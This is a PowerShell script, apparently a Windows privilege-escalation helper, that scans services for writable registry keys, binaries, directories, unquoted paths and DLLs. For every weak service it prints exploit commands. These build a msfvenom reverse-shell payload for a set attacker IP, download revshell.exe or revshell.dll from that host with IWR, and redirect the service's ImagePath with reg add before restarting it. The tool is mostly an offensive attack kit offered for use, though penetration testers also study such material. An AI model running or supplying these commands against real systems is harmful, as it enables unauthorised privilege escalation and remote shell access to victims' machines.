Write-Host "Running NeedServices.ps1 Version 1.8.7" -ForegroundColor Magenta

# Function to check if the current user has modify permissions
function Test-ModifyPermission {
    param (
        [string]$path,
        [switch]$isFile
    )
    
    try {
        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        if (-not (Test-Path $path -ErrorAction SilentlyContinue)) { return $false }
        $acl = Get-Acl -Path $path -ErrorAction Stop
        
        foreach ($access in $acl.Access) {
            if ($access.IdentityReference -eq $currentUser -and 
                $access.AccessControlType -eq 'Allow') {
                if ($isFile -and $access.FileSystemRights -match "Modify|FullControl") {
                    return $true
                }
                elseif ($path -like "HK*" -and $access.RegistryRights -match "SetValue|FullControl") {
                    return $true
                }
                elseif (-not $isFile -and $access.FileSystemRights -match "Modify|FullControl") {
                    return $true
                }
            }
        }
        return $false
    }
    catch {
        # Silently fail on permission errors, assume no modify access
        return $false
    }
}

# Function to get service configuration
function Get-ServiceConfig {
    param (
        [string]$serviceName
    )
    
    try {
        $service = Get-WmiObject -Class Win32_Service -Filter "Name='$serviceName'" -ErrorAction Stop
        if ($service) {
            return [PSCustomObject]@{
                Name            = $service.Name
                DisplayName     = $service.DisplayName
                PathName        = $service.PathName
                StartMode       = $service.StartMode
                State           = $service.State
                ServiceType     = $service.ServiceType
                StartName       = $service.StartName
                ErrorControl    = $service.ErrorControl
                AcceptPause     = $service.AcceptPause
                AcceptStop      = $service.AcceptStop
            }
        }
    }
    catch {
        return $null
    }
}

# Function to extract executable path from ImagePath
function Get-ExecutablePath {
    param (
        [string]$imagePath
    )
    $imagePath = $imagePath.Trim()
    if ($imagePath -match '^"([^"]+\.exe)"') {
        return $Matches[1]
    }
    elseif ($imagePath -match '^(.*?\.exe)') {
        return $Matches[1]
    }
    return $imagePath.Split(' ')[0]
}

# Main script
$vulnServices = @()
$attackerIP = "192.168.1.100"  # Adjust as needed
$basePort = 4444  # Starting port for exploits, incremented per vuln
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Indicate privilege level
Write-Host "Running as: $(if ($isAdmin) { 'Administrator' } else { 'Standard User (limited access)' })" -ForegroundColor Yellow

# Enumerate services
$services = Get-WmiObject -Class Win32_Service -ErrorAction SilentlyContinue
if (-not $services) {
    Write-Host "Failed to enumerate services. Check WMI permissions." -ForegroundColor Red
    exit
}

foreach ($service in $services) {
    $serviceName = $service.Name
    $fullPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
    
    $vulnInfo = [PSCustomObject]@{
        ServiceName         = $serviceName
        DisplayName         = $service.DisplayName
        Status              = $service.State
        StartType           = $service.StartMode
        RegistryModifiable  = $false
        BinaryModifiable    = $false
        BinaryDirModifiable = $false
        UnquotedPath        = $false
        DLLHijackPotential  = $false
        ImagePath           = $service.PathName
        BinaryPath          = $null
        DLLPath             = $null
    }

    try {
        # Check 1: Modifiable registry key
        $vulnInfo.RegistryModifiable = Test-ModifyPermission -path $fullPath

        # Check 2: Writable service binary and parent directory
        $isUnquoted = $false
        if ($vulnInfo.ImagePath) {
            $binaryPath = Get-ExecutablePath -imagePath $vulnInfo.ImagePath
            $vulnInfo.BinaryPath = $binaryPath
            if (Test-Path $binaryPath -ErrorAction SilentlyContinue) {
                $vulnInfo.BinaryModifiable = Test-ModifyPermission -path $binaryPath -isFile
                $binaryDir = Split-Path $binaryPath -Parent
                if (Test-Path $binaryDir -ErrorAction SilentlyContinue) {
                    $vulnInfo.BinaryDirModifiable = Test-ModifyPermission -path $binaryDir
                }

                # Check 3: Unquoted path
                $isUnquoted = ($binaryPath -like '* *' -and $binaryPath -notmatch '^".*"$')
                if ($isUnquoted -and ($vulnInfo.BinaryModifiable -or $vulnInfo.BinaryDirModifiable)) {
                    $vulnInfo.UnquotedPath = $true
                }
            }
        }

        # Check 4: DLL hijacking
        $serviceDll = (Get-ItemProperty -Path $fullPath -Name "ServiceDll" -ErrorAction SilentlyContinue).ServiceDll
        if ($serviceDll -and (Test-Path $serviceDll -ErrorAction SilentlyContinue)) {
            $vulnInfo.DLLHijackPotential = Test-ModifyPermission -path $serviceDll -isFile
            $vulnInfo.DLLPath = $serviceDll
        }

        # Add to list if vulnerable
        if ($vulnInfo.RegistryModifiable -or $vulnInfo.BinaryModifiable -or 
            $vulnInfo.BinaryDirModifiable -or $vulnInfo.UnquotedPath -or $vulnInfo.DLLHijackPotential) {
            $vulnServices += $vulnInfo
        }
    }
    catch {
        # Silent catch unless critical
    }
}

# Display results
if ($vulnServices.Count -gt 0) {
    Write-Host "`nFound $($vulnServices.Count) potentially vulnerable services:" -ForegroundColor Green
    $vulnServices | Format-Table -AutoSize -Property ServiceName, DisplayName, Status, StartType, 
        @{Label="RegMod";Expression={$_.RegistryModifiable}}, 
        @{Label="BinMod";Expression={$_.BinaryModifiable}}, 
        @{Label="DirMod";Expression={$_.BinaryDirModifiable}}, 
        @{Label="Unquoted";Expression={$_.UnquotedPath}}, 
        @{Label="DLLHijack";Expression={$_.DLLHijackPotential}}, 
        ImagePath
    
    Write-Host "Legend:" -ForegroundColor Cyan
    Write-Host "RegMod: User can modify service registry key" -ForegroundColor Gray
    Write-Host "BinMod: User can modify service executable" -ForegroundColor Gray
    Write-Host "DirMod: User can modify service binary's directory" -ForegroundColor Gray
    Write-Host "Unquoted: Service path is unquoted with spaces and modifiable" -ForegroundColor Gray
    Write-Host "DLLHijack: Service uses a modifiable DLL" -ForegroundColor Gray
    if (-not $isAdmin) {
        Write-Host "Note: Running as a standard user limits detection of system-level vulnerabilities." -ForegroundColor Yellow
    }

    Write-Host "`nDetailed Service Configurations:" -ForegroundColor Cyan
    $port = $basePort
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]  # Get just the username
    foreach ($vulnService in $vulnServices) {
        Write-Host "`nService: $($vulnService.ServiceName)" -ForegroundColor Yellow
        $config = Get-ServiceConfig -serviceName $vulnService.ServiceName
        if ($config) { $config | Format-List }

        Write-Host "Exploit Examples:" -ForegroundColor Cyan
        if ($vulnService.RegistryModifiable) {
            $payloadPath = "C:\Users\$currentUser\revshell.exe"
            Write-Host "  RegMod:" -ForegroundColor Gray
            Write-Host "    Attacker: msfvenom -p windows/shell_reverse_tcp LHOST=$attackerIP LPORT=$port -f exe -o revshell.exe" -ForegroundColor Gray
            Write-Host "    Target: IWR -Uri http://$attackerIP/revshell.exe -OutFile $payloadPath" -ForegroundColor Gray
            Write-Host "    Target: reg add HKLM\SYSTEM\CurrentControlSet\Services\$($vulnService.ServiceName) /v ImagePath /t REG_SZ /d $payloadPath /f && net start $($vulnService.ServiceName)" -ForegroundColor Gray
            $port++
        }
        if ($vulnService.BinaryModifiable) {
            $payloadDir = Split-Path $vulnService.BinaryPath -Parent
            $payloadPath = Join-Path -Path $payloadDir -ChildPath "revshell.exe"
            Write-Host "  BinMod:" -ForegroundColor Gray
            Write-Host "    Attacker: msfvenom -p windows/shell_reverse_tcp LHOST=$attackerIP LPORT=$port -f exe -o revshell.exe" -ForegroundColor Gray
            Write-Host "    Target: IWR -Uri http://$attackerIP/revshell.exe -OutFile $payloadPath" -ForegroundColor Gray
            Write-Host "    Target: reg add HKLM\SYSTEM\CurrentControlSet\Services\$($vulnService.ServiceName) /v ImagePath /t REG_SZ /d $payloadPath /f && net start $($vulnService.ServiceName)" -ForegroundColor Gray
            $port++
        }
        if ($vulnService.BinaryDirModifiable -and -not $vulnService.BinaryModifiable) {
            $payloadDir = Split-Path $vulnService.BinaryPath -Parent
            $payloadPath = Join-Path -Path $payloadDir -ChildPath "revshell.exe"
            Write-Host "  DirMod:" -ForegroundColor Gray
            Write-Host "    Attacker: msfvenom -p windows/shell_reverse_tcp LHOST=$attackerIP LPORT=$port -f exe -o revshell.exe" -ForegroundColor Gray
            Write-Host "    Target: IWR -Uri http://$attackerIP/revshell.exe -OutFile $payloadPath" -ForegroundColor Gray
            Write-Host "    Target: reg add HKLM\SYSTEM\CurrentControlSet\Services\$($vulnService.ServiceName) /v ImagePath /t REG_SZ /d $payloadPath /f && net start $($vulnService.ServiceName)" -ForegroundColor Gray
            $port++
        }
        if ($vulnService.UnquotedPath) {
            $exploitPath = Split-Path $vulnService.BinaryPath -Parent | Split-Path -Parent | Join-Path -ChildPath "revshell.exe"
            Write-Host "  Unquoted:" -ForegroundColor Gray
            Write-Host "    Attacker: msfvenom -p windows/shell_reverse_tcp LHOST=$attackerIP LPORT=$port -f exe -o revshell.exe" -ForegroundColor Gray
            Write-Host "    Target: IWR -Uri http://$attackerIP/revshell.exe -OutFile $exploitPath && net start $($vulnService.ServiceName)" -ForegroundColor Gray
            $port++
        }
        if ($vulnService.DLLHijackPotential) {
            Write-Host "  DLLHijack:" -ForegroundColor Gray
            Write-Host "    Attacker: msfvenom -p windows/shell_reverse_tcp LHOST=$attackerIP LPORT=$port -f dll -o revshell.dll" -ForegroundColor Gray
            Write-Host "    Target: IWR -Uri http://$attackerIP/revshell.dll -OutFile $($vulnService.DLLPath) && net start $($vulnService.ServiceName)" -ForegroundColor Gray
            $port++
        }
    }
} else {
    Write-Host "`nNo vulnerable services detected." -ForegroundColor Yellow
    if (-not $isAdmin) {
        Write-Host "Note: Running as a standard user may miss vulnerabilities due to limited access." -ForegroundColor Yellow
    }
}

# Export option
$export = Read-Host "`nExport results to CSV? (Y/N)"
if ($export -eq 'Y' -or $export -eq 'y') {
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $filename = "VulnerableServices_$timestamp.csv"
    $vulnServices | Export-Csv -Path $filename -NoTypeInformation
    Write-Host "Results exported to $filename" -ForegroundColor Green
}